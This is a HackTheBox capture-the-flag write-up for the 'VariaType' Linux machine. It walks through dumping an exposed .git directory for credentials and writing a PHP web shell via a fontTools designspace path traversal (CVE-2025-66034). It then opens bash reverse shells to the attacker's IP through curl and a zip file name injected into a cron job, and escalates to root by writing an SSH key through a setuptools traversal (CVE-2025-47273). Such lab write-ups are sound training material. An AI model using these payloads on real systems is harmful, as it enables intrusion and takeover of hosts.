---
title: VariaType
os: Linux
difficulty: Medium
tags:
  - Git Disclosure
  - fontTools XML Injection
  - CVE-2025-66034
  - Cron Job Command Injection
  - setuptools Path Traversal
  - CVE-2025-47273
date: 2026-03-17
---

# 🛡️ HTB - VariaType (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** VariaType
- **Operating System:** Linux (Debian)
- **Difficulty:** Medium
- **Date of Scan:** 2026-03-17
- **Vulnerabilities:** Exposed Git Directory, CDATA XML Injection & Path Traversal in fontTools (CVE-2025-66034), Filename Command Injection in Cron Job, Sudo Privilege Escalation via setuptools PackageIndex Path Traversal (CVE-2025-47273)

---

## Step 1 - Reconnaissance

We begin with an Nmap scan to discover open ports and services:

```bash
nmap -A -sS -Pn -T4 --min-rate 5000 10.129.9.136
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-17 04:31 UTC
Warning: 10.129.9.136 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.9.136
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
|_http-server-header: nginx/1.22.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/17%OT=22%CT=1%CU=43101%PV=Y%DS=2%DC=T%G=Y%TM=69B8
OS:D952%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=109%TI
OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE
OS:%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=
OS:M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   238.03 ms 10.10.14.1
2   241.56 ms 10.129.9.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.42 seconds
```

- 🔍 *The website hosts a font generation tool that accepts `.designspace` and `.ttf`/`.otf` files as input to generate a master font.*

> [!IMPORTANT]
> **Variable Fonts Production:**
> - `.designspace` files define axes, sources (e.g. Light, Bold masters), and instances for interpolation.
> - `.ttf`/`.otf` files represent the compiled binary font masters.

- 🔍 *We scan for subdomains using Gobuster:*

```bash
gobuster vhost -u http://variatype.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://variatype.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: portal.variatype.htb Status: 200 [Size: 2494]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

- 🔍 *We locate `portal.variatype.htb`, which hosts an employee portal login page ("Internal Validation Portal").*
- 🔍 *We scan for subdirectories on the main host using `dirsearch`:*

```bash
python3 dirsearch.py -u "http://variatype.htb/" -x 404
```

```text
Extensions: php, asp, aspx, jsp, html, htm
HTTP method: GET | Threads: 25
Wordlist size: 12294
Target: http://variatype.htb/

[04:36:19] Scanning:
[04:37:47] 302 -   247B - /download/users.csv  ->  /tools/variable-font-generator
[04:37:47] 302 -   247B - /download/history.csv  ->  /tools/variable-font-generator
[04:38:34] 200 -    3KB - /services

Task Completed
```

- 🔍 *Let's check the font upload functionality. Below is the intercepted POST request when uploading font files:*

```http
POST /tools/variable-font-generator/process HTTP/1.1
Host: variatype.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------40523995524206247783654491633
Content-Length: 1080
Origin: http://variatype.htb
Connection: close
Referer: http://variatype.htb/tools/variable-font-generator
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------40523995524206247783654491633
Content-Disposition: form-data; name="designspace"; filename="test.designspace"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<designspace format="4.0">
    <axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
    </axes>
    <sources>
        <source filename="test.ttf" name="Regular" familyname="TestFont">
            <location>
                <dimension name="Weight" xvalue="400"/>
            </location>
        </source>
    </sources>
    <instances>
        <instance filename="TestFont-Regular.ttf" familyname="TestFont" stylename="Regular">
            <location>
                <dimension name="Weight" xvalue="400"/>
            </location>
        </instance>
    </instances>
</designspace>

-----------------------------40523995524206247783654491633
Content-Disposition: form-data; name="masters"; filename="test.ttf"
Content-Type: font/ttf

dummy font data
-----------------------------40523995524206247783654491633--
```

- 🔍 *And the corresponding response status:*

```http
HTTP/1.1 302 FOUND
Server: nginx/1.22.1
Date: Tue, 17 Mar 2026 14:15:33 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 247
Connection: close
Location: /tools/variable-font-generator
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJGb250IGdlbmVyYXRpb24gZmFpbGVkIGR1cmluZyBwcm9jZXNzaW5nLiJdfV19.abliBQ.FFkN1uzNuhSuPdjg812_Rki1-Ow; HttpOnly; Path=/

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/tools/variable-font-generator">/tools/variable-font-generator</a>. If not, click the link.
```

- 🔍 *Let's perform subdirectory enumeration on `portal.variatype.htb`:*

```bash
python3 dirsearch.py -u "http://portal.variatype.htb/" -x 404
```

```text
Extensions: php, asp, aspx, jsp, html, htm
HTTP method: GET | Threads: 25
Wordlist size: 12294
Target: http://portal.variatype.htb/

[14:38:16] Scanning:
[14:38:36] 301 -   169B - /.git  ->  http://portal.variatype.htb/.git/
[14:38:36] 403 -   555B - /.git/
[14:38:36] 200 -    73B - /.git/description
[14:38:36] 200 -    39B - /.git/COMMIT_EDITMSG
[14:38:36] 200 -   143B - /.git/config
[14:38:36] 200 -    23B - /.git/HEAD
[14:38:36] 403 -   555B - /.git/hooks/
[14:38:36] 200 -   137B - /.git/index
[14:38:36] 403 -   555B - /.git/info/
[14:38:36] 403 -   555B - /.git/branches/
[14:38:36] 200 -   240B - /.git/info/exclude
[14:38:36] 301 -   169B - /.git/logs/refs  ->  http://portal.variatype.htb/.git/logs/refs/
[14:38:36] 200 -   700B - /.git/logs/HEAD
[14:38:36] 403 -   555B - /.git/logs/
[14:38:36] 200 -   700B - /.git/logs/refs/heads/master
[14:38:36] 301 -   169B - /.git/logs/refs/heads  ->  http://portal.variatype.htb/.git/logs/refs/heads/
[14:38:36] 301 -   169B - /.git/refs/heads  ->  http://portal.variatype.htb/.git/refs/heads/
[14:38:36] 403 -   555B - /.git/objects/
[14:38:36] 200 -    41B - /.git/refs/heads/master
[14:38:36] 403 -   555B - /.git/refs/
[14:38:37] 301 -   169B - /.git/refs/tags  ->  http://portal.variatype.htb/.git/refs/tags/
[14:40:16] 200 -     0B - /auth.php
[14:40:42] 302 -     0B - /dashboard.php  ->  /
[14:40:46] 302 -     0B - /download.php  ->  /
[14:40:54] 301 -   169B - /files  ->  http://portal.variatype.htb/files/
[14:40:55] 403 -   555B - /files/
[14:41:02] 200 -    2KB - /index.php
```

- 🔍 *The `.git` repository folder is exposed. We write a python script `Complete Portal Downloader` to systematically reconstruct the `.git` database and download all source files:*

```python
#!/usr/bin/env python3
import requests
import os
import sys
from urllib.parse import urljoin
import time
import logging

BASE_URL = "http://portal.variatype.htb"
OUTPUT_DIR = "portal_dump"
PROXY = None 

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('download.log'),
        logging.StreamHandler()
    ]
)

PATHS = [
    ".git/description",
    ".git/COMMIT_EDITMSG",
    ".git/config",
    ".git/HEAD",
    ".git/index",
    ".git/info/exclude",
    ".git/logs/HEAD",
    ".git/logs/refs/heads/master",
    ".git/refs/heads/master",
    "auth.php",
    "dashboard.php",
    "download.php",
    "index.php",
    ".git/",
    ".git/hooks/",
    ".git/info/",
    ".git/branches/",
    ".git/logs/",
    ".git/logs/refs/",
    ".git/logs/refs/heads/",
    ".git/objects/",
    ".git/refs/",
    ".git/refs/heads/",
    ".git/refs/tags/",
    "files/",
]

GIT_FILES_EXTENDED = [
    ".git/ORIG_HEAD",
    ".git/FETCH_HEAD",
    ".git/MERGE_HEAD",
    ".git/CHERRY_PICK_HEAD",
    ".git/REBASE_HEAD",
    ".git/REVERT_HEAD",
    ".git/refs/remotes/origin/master",
    ".git/refs/stash",
    ".git/refs/notes/commits",
    ".git/packed-refs",
    ".git/objects/info/packs",
    ".git/info/refs",
    ".git/logs/refs/remotes/origin/master",
    ".git/logs/refs/stash",
    ".git/hooks/applypatch-msg.sample",
    ".git/hooks/commit-msg.sample",
    ".git/hooks/post-update.sample",
    ".git/hooks/pre-applypatch.sample",
    ".git/hooks/pre-commit.sample",
    ".git/hooks/pre-push.sample",
    ".git/hooks/pre-rebase.sample",
    ".git/hooks/pre-receive.sample",
    ".git/hooks/prepare-commit-msg.sample",
    ".git/hooks/update.sample",
]

class PortalDownloader:
    def __init__(self, base_url, output_dir, proxy=None):
        self.base_url = base_url
        self.output_dir = output_dir
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.stats = {'downloaded': 0, 'failed': 0, 'skipped': 0, 'forbidden': 0, 'not_found': 0}

    def ensure_dir(self, filepath):
        directory = os.path.dirname(filepath)
        if directory and not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)

    def download_file(self, path):
        url = urljoin(self.base_url, path)
        output_path = os.path.join(self.output_dir, path)
        if path.endswith('/'):
            self.ensure_dir(output_path)
            logging.info(f"[DIR] Created: {path}")
            return True
        self.ensure_dir(output_path)
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            if response.status_code == 200:
                with open(output_path, 'wb') as f:
                    f.write(response.content)
                size = len(response.content)
                logging.info(f"[200] Downloaded: {path} ({size} bytes)")
                self.stats['downloaded'] += 1
                return True
            elif response.status_code == 403:
                logging.info(f"[403] Forbidden: {path}")
                self.stats['forbidden'] += 1
                return False
            elif response.status_code == 404:
                self.stats['not_found'] += 1
                return False
        except requests.exceptions.RequestException as e:
            logging.error(f"[ERROR] Failed to download {path}: {str(e)}")
            self.stats['failed'] += 1
            return False

    def download_all(self, paths, delay=0.1):
        for i, path in enumerate(paths, 1):
            self.download_file(path)
            time.sleep(delay)

    def extract_git_objects(self):
        head_path = os.path.join(self.output_dir, ".git/HEAD")
        if os.path.exists(head_path):
            with open(head_path, 'r') as f:
                head_content = f.read().strip()
            if head_content.startswith('ref:'):
                ref = head_content[5:].strip()
                ref_path = os.path.join(self.output_dir, ".git", ref)
                if os.path.exists(ref_path):
                    with open(ref_path, 'r') as f:
                        commit_hash = f.read().strip()
                    obj_dir = commit_hash[:2]
                    obj_file = commit_hash[2:]
                    self.download_file(f".git/objects/{obj_dir}/{obj_file}")

        log_path = os.path.join(self.output_dir, ".git/logs/HEAD")
        if os.path.exists(log_path):
            with open(log_path, 'r') as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 2:
                        for hash_val in parts[:2]:
                            if len(hash_val) == 40:
                                obj_dir = hash_val[:2]
                                obj_file = hash_val[2:]
                                self.download_file(f".git/objects/{obj_dir}/{obj_file}")
                                time.sleep(0.05)

def main():
    downloader = PortalDownloader(BASE_URL, OUTPUT_DIR, PROXY)
    all_paths = []
    all_paths.extend(PATHS)
    all_paths.extend(GIT_FILES_EXTENDED)
    seen = set()
    unique_paths = [x for x in all_paths if not (x in seen or seen.add(x))]
    downloader.download_all(unique_paths, delay=0.1)
    downloader.extract_git_objects()

if __name__ == "__main__":
    main()
```

- 🔍 *We verify the local dumped directory layout:*

```bash
ls -la portal_dump/.git
```

```text
total 40
drwxr-xr-x 8 root root 4096 Jul 03 07:06 .
drwxr-xr-x 3 root root 4096 Jul 03 07:06 ..
-rw-r----h 1 root root   23 Jul 03 07:06 HEAD
-rw-r----h 1 root root  143 Jul 03 07:06 config
-rw-r----h 1 root root   73 Jul 03 07:06 description
-rw-r----h 1 root root  137 Jul 03 07:06 index
drwxr-xr-x 5 root root 4096 Jul 03 07:06 logs
drwxr-xr-x 6 root root 4096 Jul 03 07:06 objects
drwxr-xr-x 4 root root 4096 Jul 03 07:06 refs
```

- 🔍 *We inspect the git configuration:*

```ini
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Dev Team
        email = dev@variatype.htb
```

- 🔍 *We check the repository object hashes and inspect the Git commit logs:*

```bash
git log --oneline
```

```text
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
```

- 🔍 *We write a quick Python validation script to decompress all git objects and scan for credentials:*

```python
import zlib
import os

for root, dirs, files in os.walk('portal_dump/.git/objects'):
    for file in files:
        if len(file) == 38:
            filepath = os.path.join(root, file)
            with open(filepath, 'rb') as f:
                try:
                    data = zlib.decompress(f.read())
                    if b'gitbot' in data:
                        print(f"*** FOUND DATA IN: {filepath} ***")
                        print(data.decode('utf-8', errors='ignore'))
                except Exception:
                    pass
```

```text
*** FOUND DATA IN: portal_dump/.git/objects/75/3b5f5957f2020480a19bf29a0ebc80267a4a3d ***
commit 259tree c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4
parent 5030e791b764cb2a50fcb3e2279fea9737444870
author Dev Team <dev@variatype.htb> 1764968373 -0500
committer Dev Team <dev@variatype.htb> 1764968373 -0500

fix: add gitbot user for automated validation pipeline
```

- 🔍 *The commit object references tree `c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4`. We download this tree object:*

```bash
curl -o portal_dump/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4
```

- 🔍 *We parse the downloaded tree:*

```python
import zlib
with open('portal_dump/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4', 'rb') as f:
    data = zlib.decompress(f.read())
print(data)
```

```text
b'tree 36\x00100644 auth.php\x00\xb3(0_\x0e\x85\xc2\xb9z~*\x94\x97\x8a\xe2\x0f\x16\xdbu\xe8'
```

- 🔍 *`auth.php` corresponds to blob hash `b328305f0e85c2b97a7e2a94978ae20f16db75e8`. We download and parse it:*

```bash
curl -o portal_dump/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8
```

```python
import zlib
with open('portal_dump/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8', 'rb') as f:
    print(zlib.decompress(f.read()).decode('utf-8'))
```

```php
<?php
session_start();
$USERS = [
    'gitbot' => 'G1tB0t_Acc3ss_2025!'
];
```

- 🔍 *We have retrieved credentials: `gitbot / G1tB0t_Acc3ss_2025!`.*

---

## Step 2 - Initial Foothold

- 🔍 *Reviewing vulnerabilities in `fontTools.varLib` affecting versions `4.33.0` to `< 4.60.2`:*

> [!WARNING]
> **CVE-2025-66034 - fontTools Path Traversal & XML Injection:**
> 1. **Path Traversal:** The `filename` attribute in `<variable-fonts>` does not sanitize input, permitting path traversal directory escapes (`../`).
> 2. **XML Injection:** The `<labelname>` tags inside `.designspace` files allow CDATA sections. These can contain arbitrary PHP script structures that write executable payloads when compiled.

- 🔍 *We write a Python script to build the font master binaries required by `varLib`:*

```python
#!/usr/bin/env python3
import os
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()
    
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
    fb.save(filename)

if __name__ == '__main__':
    create_source_font("source-light.ttf", weight=100)
    create_source_font("source-regular.ttf", weight=400)
```

- 🔍 *Next, we create the malicious `.designspace` file incorporating the CDATA PHP payload:*

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
    <axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
            <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]></labelname>
        </axis>
    </axes>
    <sources>
        <source filename="source-light.ttf" name="Light">
            <location>
                <dimension name="Weight" xvalue="100"/>
            </location>
        </source>
        <source filename="source-regular.ttf" name="Regular">
            <location>
                <dimension name="Weight" xvalue="400"/>
            </location>
        </source>
    </sources>
    <variable-fonts>
        <variable-font name="MaliciousFont" filename="../../../../../../../var/www/portal.variatype.htb/public/files/shell.php">
            <axis-subsets>
                <axis-subset name="Weight"/>
            </axis-subsets>
        </variable-font>
    </variable-fonts>
</designspace>
```

- 🔍 *We upload the designspace configurations and master fonts using `curl`:*

```bash
curl -v -X POST http://variatype.htb/tools/variable-font-generator/process \
  -F "designspace=@malicious.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf" \
  -H "Expect:"
```

- 🔍 *We check the uploaded PHP shell path to verify arbitrary command execution:*

```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- 🔍 *We execute a reverse shell payload:*

```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.67%2F4444%200%3E%261%27"
```

- 🔍 *We catch the incoming shell on our local listener:*

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.67] from (UNKNOWN) [10.129.9.136] 35860
bash: cannot set terminal process group (3365): Inappropriate ioctl for device
bash: no job control in this shell
www-data@variatype:~/portal.variatype.htb/public/files$ whoami
www-data
```

- 🔍 *Local system enumeration reveals a recurring Cron job executing an unzipping script:*
  `/home/steve/bin/process_client_submissions.sh`

- 🔍 *The script processes zipped submissions. The unzip wrapper evaluates extracted filenames inside a shell command context without sanitization.*
- 🔍 *We generate a malicious zip file containing an archive element named with our base64 reverse shell command command-substitution payload:*

```python
#!/usr/bin/env python3
import zipfile
import base64

rev_shell = "bash -i >& /dev/tcp/10.10.14.67/4445 0>&1"
payload = base64.b64encode(rev_shell.encode()).decode()
exploit_filename = f'$(echo {payload}|base64 -d|bash).ttf'

with zipfile.ZipFile('exploit.zip', 'w') as zipf:
    zipf.writestr(exploit_filename, "Trigger reverse shell")
```

- 🔍 *We transfer the generated zip to the target folder:*

```bash
curl http://10.10.14.67:8000/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip
```

- 🔍 *We start the shell listener and wait for the cron job to run:*

```bash
nc -lvnp 4445
```

```text
listening on [any] 4445 ...
connect to [10.10.14.67] from (UNKNOWN) [10.129.9.136] 34090
bash: no job control in this shell
steve@variatype:/tmp/ffarchive-4530-1$ whoami
steve
```

- 🔍 *We obtain user `steve`. Let's read the user flag:*

```bash
cat /home/steve/user.txt
```

```text
9d0124e8************************
```

---

## Step 3 - Privilege Escalation

- 🔍 *We check Steve's sudo permissions:*

```bash
sudo -l
```

```text
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

- 🔍 *Steve is allowed to run the `/opt/font-tools/install_validator.py` script as root without a password.*

> [!WARNING]
> **CVE-2025-47273 - setuptools PackageIndex Path Traversal:**
> The `install_validator.py` script imports `setuptools.package_index.PackageIndex`, which is vulnerable to path traversal.
> 
> The `download()` method retrieves files from user-supplied URLs but does not sanitize the output filenames. If the URL contains path traversal sequences like `%2Froot%2F.ssh%2Fauthorized_keys`, the download destination escapes the output directory, permitting arbitrary file writes on the filesystem.

- 🔍 *We generate an SSH key pair on our host machine and configure our public key:*

```bash
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
mkdir -p /tmp/serve
cp /tmp/rootkey.pub /tmp/serve/authorized_keys
```

- 🔍 *We write a custom python HTTP server code `serve.py` to deliver the payload:*

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('authorized_keys', 'rb') as f:
            data = f.read()
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', len(data))
        self.end_headers()
        self.wfile.write(data)

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

- 🔍 *We launch the server on our host and trigger the validator script with traversal parameters on the target:*

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://10.10.14.67:8888/%2Froot%2F.ssh%2Fauthorized_keys"
```

```text
2026-03-20 02:11:33,769 [INFO] Attempting to install plugin from: http://10.10.14.67:8888/%2Froot%2F.ssh%2Fauthorized_keys
2026-03-20 02:11:33,777 [INFO] Downloading http://10.10.14.67:8888/%2Froot%2F.ssh%2Fauthorized_keys
2026-03-20 02:11:36,463 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

- 🔍 *The validator script writes our public key directly into root's `.ssh` directory. We connect as root via SSH:*

```bash
ssh -i /tmp/rootkey root@10.129.9.136
```

```text
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
Last login: Fri Mar 20 02:14:34 2026 from 10.10.14.67
root@variatype:~# whoami
root
```

- 🔍 *We read the root flag:*

```bash
cat /root/root.txt
```

```text
3accbc65************************
```

- 🔍 *Full Host Compromised.*
